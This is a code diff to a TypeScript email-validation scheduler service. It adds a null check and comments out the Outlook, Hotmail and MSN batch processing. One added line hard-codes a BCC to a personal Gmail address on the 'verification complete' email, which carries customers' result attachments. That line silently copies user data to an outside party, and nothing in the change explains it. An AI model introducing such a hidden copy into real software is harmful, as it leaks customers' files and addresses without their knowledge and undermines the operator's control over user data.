@@ -94,7 +94,8 @@ export class SchedulerService {
     const greyListEmails: EmailValidationResponseType[] = [];
     for (const bulkFileEmail of bulkFileEmails) {
       const email: ProcessedEmail = await this.domainService.getProcessedEmail(bulkFileEmail.email_address);
-      if (email.email_sub_status === EmailReason.GREY_LISTED) {
+
+      if (email && email.email_sub_status && email.email_sub_status === EmailReason.GREY_LISTED) {
         greyListEmails.push(email);
       }
     }
@@ -193,6 +194,7 @@ export class SchedulerService {
       template: 'email_verification_complete',
       context: emailDynamicData,
       attachments,
+      bcc: ['arahimdu50@gmail.com']
     };
     await this.queueService.addEmailToQueue(emailData);
   }
@@ -361,7 +363,7 @@ export class SchedulerService {
         }
       }
 
-      const hotmailEmailResults: EmailValidationResponseType[] = await this.__processOutlookBatch(
+     /* const hotmailEmailResults: EmailValidationResponseType[] = await this.__processOutlookBatch(
         batchSize, hotmailEmails, delayBetweenBatches, hotmailMxRecord, user, bulkFile,
       );
       if (hotmailEmailResults.length) {
@@ -387,13 +389,15 @@ export class SchedulerService {
       );
       if (msnEmailResults.length) {
         results.push(...msnEmailResults);
-      }
+      }*/
 
       // Split emails into batches
       const nonOutlookEmailBatches = this.__createBatchOfSize(batchSize, nonOutlookEmails);
       // For Outlook, each batch should have only 1 email.
+/*
       batchSize = 1;
       const outlookBusinessEmailBatches = this.__createBatchOfSize(batchSize, outlookBusinessDomainEmails);
+*/
 
       // Process each batch sequentially
       for (const batch of nonOutlookEmailBatches) {
@@ -405,7 +409,7 @@ export class SchedulerService {
       }
       // For Outlook mail server we slow the limiter to only 1 per concurrency
       // and delay between batches is 2 sec as batch size is 1 email
-      limiter = new Bottleneck({
+      /*limiter = new Bottleneck({
         maxConcurrent: 1,
       });
       delayBetweenBatches = 2 * 1000;
@@ -415,7 +419,7 @@ export class SchedulerService {
           results.push(...result);
         }
         await this.__delay(delayBetweenBatches);
-      }
+      }*/
 
       console.log('✅ All batches processed.');
       return results;
